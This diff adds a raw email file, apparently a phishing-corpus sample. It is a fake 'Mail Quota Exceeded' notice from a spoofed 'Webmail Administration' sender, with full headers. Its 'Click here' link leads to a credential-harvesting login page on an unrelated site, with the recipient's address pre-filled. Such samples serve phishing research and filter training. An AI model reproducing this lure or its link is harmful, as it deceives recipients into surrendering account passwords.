@@ -1,0 +1,106 @@
+Return-Path: ziaul.karim@bd.g4s.com
+Delivered-To: jose@monkey.org
+X-FDA: 71366498658.18.stop92_9f2548d84c03
+X-Spam-Summary: 30,2,0,9ae432f27c6b8ec7,d41d8cd98f00b204,ziaul.karim@bd.g4s.com,:,RULES_HIT:41:72:379:474:495:800:962:967:969:973:978:983:988:989:1189:1208:1221:1254:1260:1261:1263:1313:1314:1381:1431:1433:1434:1436:1437:1516:1517:1518:1535:1542:1561:1571:1575:1588:1589:1592:1594:1710:1711:1714:1730:1749:1776:1792:2198:2199:2525:2527:2549:2560:2563:2682:2685:2859:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3148:3362:3650:3867:3868:3871:3873:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4321:4552:5007:6238:6261:6653:6684:6688:7784:8599:8603:8784:8885:8987:9025:9059:9080:9388:9411:9468:9871:9908:10004:10248:10346:10400:11480:11658:11914:12043:12126:12438:12517:12519:12555:12658:12659:13025:13139:13237:13439:14093:14096:14181:14721:21080:30026:30054:30070,0,RBL:error,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fe,MSBL:0,DNSBL:neutral,Custom_rules:0:0:0,LFtime:66,LUA_SUMMARY:none
+X-HE-Tag: stop92_9f2548d84c03
+X-Filterd-Recvd-Size: 5325
+Received: from mail.bd.g4s.com (mail.bd.g4s.com [119.148.26.10])
+	by imf16.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Sun,  3 Apr 2016 23:44:28 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=bd.g4s.com;
+	 s=default; h=Date:From:To:Subject:MIME-Version:Content-Type;
+	bh=KDw9xqY0U5qERlfqLZqBhIqB1ciIXOhC8KtXZ+1uxUM=; b=Of4ZQKKCtEkIo+usxq/W4vFpon
+	9eF39/KgQghTPzNHAvivg8INcsYERS/kMSck8BgYbsFqodYIk4uZh5cMglyDU5+hqcP9h9wRPaSvx
+	VsnCDBLaSoNksH9rOx/JtbA7+boG9nkzJ/5TSZAf9cuX9Vc2RFVALcpsy5zXPz5mppIo=;
+Received: from pd95cc832.dip0.t-ipconnect.de ([217.92.200.50]:55614 helo=[192.168.0.100])
+	by panel1.agni.com with esmtpsa (TLSv1:DHE-RSA-AES256-SHA:256)
+	(Exim 4.86_1)
+	(envelope-from <ziaul.karim@bd.g4s.com>)
+	id 1amrgv-00032g-5j
+	for jose@monkey.org; Mon, 04 Apr 2016 05:44:25 +0600
+Content-Type: multipart/alternative; boundary="===============0142135429=="
+MIME-Version: 1.0
+Subject: Mail Quota Exceeded
+To: jose@monkey.org
+From: "Webmail Administration" <ziaul.karim@bd.g4s.com>
+Date: Mon, 04 Apr 2016 01:43:59 +0200
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - panel1.agni.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - bd.g4s.com
+X-Get-Message-Sender-Via: panel1.agni.com: authenticated_id: ziaul.karim@bd.g4s.com
+X-Authenticated-Sender: panel1.agni.com: ziaul.karim@bd.g4s.com
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 148
+
+You will not see this in a MIME-aware mail reader.
+--===============0142135429==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+ Your mailbox is almost full.
+
+Dear jose@monkey.org, =
+
+   3840MB	  	 4096MB
+  Current size	  	 Maximum size
+ Please reduce your mailbox size. Delete any items you don't need from your=
+ mailbox and empty your Deleted Items folder. Click here to do reduce size =
+automatically.   Thanks, Mail System Administrator
+--===============0142135429==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<HTML><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Diso-8859-1"/></head><BODY><DIV id=3Dyui_3_16_0_1_1416833742232_5370>
+<DIV id=3Dyui_3_16_0_1_1416833742232_5372 style=3D"MARGIN-BOTTOM: 14pt; MAR=
+GIN-TOP: 14pt"><SPAN style=3D"FONT-SIZE: medium; FONT-FAMILY: Arial; COLOR:=
+ #000066"><STRONG>Your mailbox is almost full.</STRONG></SPAN><BR><BR>Dear =
+jose@monkey.org,</DIV>
+<TABLE id=3Dyui_3_16_0_1_1416833742232_5377 cellSpacing=3D0>
+<TBODY id=3Dyui_3_16_0_1_1416833742232_5376>
+<TR id=3Dyui_3_16_0_1_1416833742232_5392>
+<TD id=3Dyui_3_16_0_1_1416833742232_5391 style=3D"BORDER-TOP: black 1px sol=
+id; BORDER-RIGHT-WIDTH: 1px; BORDER-BOTTOM: black 1px solid; BORDER-LEFT: b=
+lack 1px solid; WIDTH: 187px; BACKGROUND-COLOR: #ffcc00; BORDER-: black" wi=
+dth=3D187><SPAN id=3Dyui_3_16_0_1_1416833742232_5390 style=3D"BACKGROUND-CO=
+LOR: #ffcc00"><SPAN id=3Dyui_3_16_0_1_1416833742232_5389 style=3D"FONT-SIZE=
+: small; COLOR: black">3840MB</SPAN></SPAN></TD>
+<TD style=3D"BORDER-LEFT-WIDTH: 1px; BORDER-TOP: black 1px solid; BORDER-RI=
+GHT: black 1px solid; BORDER-BOTTOM: black 1px solid; WIDTH: 13px; BACKGROU=
+ND-COLOR: white; BORDER-LEFT-COLOR: black" width=3D13><SPAN style=3D"BACKGR=
+OUND-COLOR: white">&nbsp;</SPAN></TD>
+<TD><SPAN style=3D"FONT-SIZE: small; COLOR: black"><STRONG>4096</STRONG></S=
+PAN><SPAN style=3D"FONT-SIZE: small; COLOR: black">MB</SPAN></TD></TR>
+<TR id=3Dyui_3_16_0_1_1416833742232_5375>
+<TD id=3Dyui_3_16_0_1_1416833742232_5388 style=3D"WIDTH: 187px" width=3D187=
+><SPAN id=3Dyui_3_16_0_1_1416833742232_5387 style=3D"FONT-SIZE: xx-small; C=
+OLOR: white">Current size</SPAN></TD>
+<TD id=3Dyui_3_16_0_1_1416833742232_5374 style=3D"WIDTH: 13px" width=3D13>&=
+nbsp;</TD>
+<TD><SPAN style=3D"FONT-SIZE: xx-small; COLOR: white">Maximum size</SPAN></=
+TD></TR></TBODY></TABLE>
+<DIV id=3Dyui_3_16_0_1_1416833742232_5381 style=3D"MARGIN-BOTTOM: 14pt; MAR=
+GIN-TOP: 14pt"><SPAN id=3Dyui_3_16_0_1_1416833742232_5380 style=3D"FONT-SIZ=
+E: small; FONT-FAMILY: Tahoma; COLOR: black">Please reduce your mailbox siz=
+e. Delete any items you don't need from your mailbox and empty your Deleted=
+ Items folder. <A href=3D"http://ozblocos.com.br/wp-includes/1/Webmail%20Lo=
+gin.php?email=3Djose@monkey.org" rel=3Dnofollow target=3D_blank>Click here<=
+/A> to do reduce size automatically.</SPAN></DIV></DIV>
+<DIV id=3Dyui_3_16_0_1_1416833742232_5382 style=3D"MARGIN-BOTTOM: 0pt; BACK=
+GROUND: white; LINE-HEIGHT: 14.4pt"><B><SPAN style=3D"COLOR: black"></SPAN>=
+</B><SPAN style=3D"COLOR: #333333"></SPAN>&nbsp;</DIV>
+<DIV id=3Dyui_3_16_0_1_1416833742232_5383 style=3D"MARGIN-BOTTOM: 0pt; BACK=
+GROUND: white; LINE-HEIGHT: 14.4pt"><B><SPAN style=3D"COLOR: black">Thanks,=
+</SPAN></B><SPAN style=3D"COLOR: #333333"></SPAN></DIV>
+<DIV id=3Dyui_3_16_0_1_1416833742232_5384 style=3D"MARGIN-BOTTOM: 0pt; BACK=
+GROUND: white; LINE-HEIGHT: 14.4pt"><B><SPAN style=3D"COLOR: black">Mail Sy=
+stem Administrator</SPAN></B></DIV></BODY></HTML>
+--===============0142135429==--
